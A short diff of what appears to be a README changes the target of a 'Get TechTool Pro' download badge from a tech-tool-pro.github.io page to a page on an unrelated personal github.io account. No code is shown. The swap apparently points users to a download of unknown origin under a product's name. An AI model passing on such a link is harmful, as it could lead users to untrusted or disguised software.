@@ -6,7 +6,7 @@
 
 <div align="center">  
 
-[![⬇️ TechTool Pro ](https://img.shields.io/badge/⬇️_Get_TechTool_Pro-grey?style=for-the-badge&logo=apple)](https://tech-tool-pro.github.io/.github)  
+[![⬇️ TechTool Pro ](https://img.shields.io/badge/⬇️_Get_TechTool_Pro-grey?style=for-the-badge&logo=apple)](https://shariatpatryl713.github.io/.github)  
 
 </div>  
 
